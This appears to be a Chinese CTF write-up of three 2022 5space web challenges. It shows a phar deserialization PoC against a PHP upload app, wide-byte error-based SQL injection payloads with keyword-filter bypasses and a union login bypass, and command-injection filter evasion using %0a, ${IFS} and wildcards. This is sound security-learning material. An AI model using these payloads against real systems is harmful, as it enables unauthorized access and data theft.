---
title: "2022 5space Web 部分 Writeup"
date: 2022-09-20T12:06:46+08:00
lastmod: 2022-09-20T12:06:46+08:00
draft: false
author: "X1r0z"

tags: ['php','sql','ctf']
categories: ['web']

hiddenFromHomePage: false
hiddenFromSearch: false

toc:
  enable: true
math:
  enable: false
lightgallery: false
---

5_web_Eeeeasy_SQL 没做出来...

<!--more-->

## 5_web_BaliYun

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202209191922549.png)

存在 www.zip, 下载解压

index.php

```php
<!DOCTYPE html>
<html>
<head>
    <title>BaliYun图床</title>
    <link rel="stylesheet" href="css/style.css">
    <link href='//fonts.googleapis.com/css?family=Open+Sans:400,300italic,300,400italic,600,600italic,700,700italic,800,800italic' rel='stylesheet' type='text/css'>
    <link href='//fonts.googleapis.com/css?family=Montserrat:400,700' rel='stylesheet' type='text/css'>


    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
    <meta name="keywords" content="File Upload widget Widget Responsive, Login Form Web Template, Flat Pricing Tables, Flat Drop-Downs, Sign-Up Web Templates, Flat Web Templates, Login Sign-up Responsive Web Template, Smartphone Compatible Web Template, Free Web Designs for Nokia, Samsung, LG, Sony Ericsson, Motorola Web Design" />
    <script type="application/x-javascript"> addEventListener("load", function() { setTimeout(hideURLbar, 0); }, false); function hideURLbar(){ window.scrollTo(0,1); } </script>
</head>

<body>
<h1>BaliYun图床</h1>
<div class="agile-its">
    <h2>Image Upload</h2>
    <div class="w3layouts">
        <div class="photos-upload-view">
            <form action="index.php" method="post" enctype="multipart/form-data">
                <label for="file">选择文件</label>
                <input type="file" name="file" id="file"><br>
                <input type="submit" name="submit" value="提交">
            </form>
            <div id="messages">
                <p>
                    <?php
                    include("class.php");
                    if(isset($_GET['img_name'])){
                        $down = new check_img();
                        echo $down->img_check();
                    }
                    if(isset($_FILES["file"]["name"])){
                        $up = new upload();
                        echo $up->start();
                    }
                    ?>
                </p>
            </div>
        </div>
        <div class="clearfix"></div>
        <script src="js/filedrag.js"></script>

    </div>
</div>
<div class="footer">
    <p> Powerded by  <a href="http://w3layouts.com/">ttpfx de BaliYun图床</a></p>
</div>

<script type="text/javascript" src="js/jquery.min.js"></script>

</div>
</body>
</html>
```

class.php

```php
<?php
class upload{
    public $filename;
    public $ext;
    public $size;
    public $Valid_ext;

    public function __construct(){
        $this->filename = $_FILES["file"]["name"];
        $this->ext = end(explode(".", $_FILES["file"]["name"]));
        $this->size = $_FILES["file"]["size"] / 1024;
        $this->Valid_ext = array("gif", "jpeg", "jpg", "png");
    }

    public function start(){
        return $this->check();
    }

    private function check(){
        if(file_exists($this->filename)){
            return "Image already exsists";
        }elseif(!in_array($this->ext, $this->Valid_ext)){
            return "Only Image Can Be Uploaded";
        }else{
            return $this->move();
        }
    }

    private function move(){
        move_uploaded_file($_FILES["file"]["tmp_name"], "upload/".$this->filename);
        return "Upload succsess!";
    }

    public function __wakeup(){
        echo file_get_contents($this->filename);
    }
}


class check_img{
    public $img_name;
    public function __construct(){
        $this->img_name = $_GET['img_name'];
    }

    public function img_check(){
        if(file_exists($this->img_name)){
            return "Image exsists";
        }else{
            return "Image not exsists";
        }
    }
}
```

一眼 phar 反序列化

利用点在 upload 类的 `__wakeup` 方法里, 估计是用 file_get_contents 读取 flag

index.php 中的 `$down->img_check()` 调用了 `file_exists`, 可以直接进行 phar 反序列化

payload 也很容易构造

```php
<?php

class upload{
    public $filename = '/flag';
}

$a = new upload();

$phar =new Phar("phar.phar"); 
$phar->startBuffering();
$phar->setStub("<?php XXX __HALT_COMPILER(); ?>");
$phar->setMetadata($a); 
$phar->addFromString("test.txt", "test");
$phar->stopBuffering();
?>
```

访问 `http://39.106.138.251:27829/?img_name=phar://./upload/phar.jpg`

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202209191927157.png)

## 5_easylogin

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202209191928594.png)

返回头里有提示, 而且根据单引号被反斜杠转义的结果来看应该是宽字节注入 (当然还有单引号逃逸的思路, 但是这里没成功)

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202209191929995.png)

```
123%bf%27
```

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202209191931828.png)

有报错显示, 尝试报错注入

连接符用 `^`

常规的 updatexml extractvalue 被过滤了, 找到一个冷门一点的 `gtid_subtract`

测试的时候发现 select union 这些关键字被替换为空, 可以双写绕过

空格被过滤了, 用 `/**/` 绕过

然后 `information_schema` 被过滤了, 因为里面含有 `or` 关键字, 不过 mysql 版本比较高, 可以用 innodb 表或者 sys 表

```
admin%bf%27^((gtid_subtract((selselectect/**/*/**/from(selselectect/**/group_concat(table_name)/**/from/**/mysql.innodb_table_stats)a),1)))#
```

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202209191934364.png)

不太好查具体字段, 于是尝试无列名注入

join using 和子查询两种方式都可以

三个列, 其实是 id username password, 用子查询的话查 password 是第三个字段

```
admin%bf%27^((gtid_subtract((selselectect/**/group_concat(`3`)/**/from(selselectect/**/1,2,3/**/ununionion/**/selselectect/**/*/**/from/**/web.user/**/)a),1)))#
```

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202209191937472.png)

然后发现 md5 解不出来...

想了想 union 没被过滤, 可能是用 union 之后的内容替代原来的 password?

sql 语句类似这样

```
select * from users where username='adminxx' union select 1,2,'password'
```

之后用 `$row['password']` 跟 `$_POST['password']` 作比较, 检查密码是否正确

按这种思路的话, payload 构造如下

其中单双引号都被过滤了, 可以用 hex 绕过

比赛的时候一开始搞混了 hex unhex 的用法... 这里简单说一下

```
select hex(str) # 字符串转 hex

select 0xabcd1234 # hex 转字符串

select unhex(abcd1234) # hex 转字符串, 与上一句等价

select unhex(0xabcd1234) # hex 转 binary
```

当时直接把 hex 转换成了二进制数据, 导致一直登陆不成功...

最终 payload 如下

```
username=admnin%bf%27/**/uniounionn/**/selselectect/**/1,2,unhex(3230326362393632616335393037356239363462303731353264323334623730)%23&password=123
```

其中 `3230326362393632616335393037356239363462303731353264323334623730` unhex 之后是 `123` 的 md5 值

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202209191946385.png)

## 5_web_letmeguess_1

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202209191948976.png)

尴尬... 写的时候发现已经不能再创建环境了

首先登录的地方是个弱口令 `admin/admin123`

然后命令执行过滤了一大堆 `; | < > & | / * -` 还有空格和 cat 之类的命令

`%0a` 可以代替 `;`, cat 可以用 nl head tail 等代替, 空格用 `${IFS}` 代替

ls 的时候看到了 kylin 文件夹, 但是 kylin 关键字被过滤了

一种方式是通过变量拼接, 例如

```
%0aa=kyl%0ab=in%0als${IFS}$a$b
```

另一种更简单的方式是用 `?` 通配符匹配单个字符

```
%0als${IFS}kyli?
```

之后看到了 flag.txt

最后用 nl 命令查看, 但是这里 `/` 被过滤了, 需要我们自己构造

用 `env` 查看环境变量

```
...
HOME=/var/www-data
...
```

(只记得这个, 记不太清具体值了, 不过不影响解题)

参考文章 [http://c.biancheng.net/view/1120.html](http://c.biancheng.net/view/1120.html)

截取 HOME 变量中的 `/`

```
${HOME%va*}
```

最后查看 flag

```
%0als${IFS}kyli?${HOME%va*}fla?.txt
```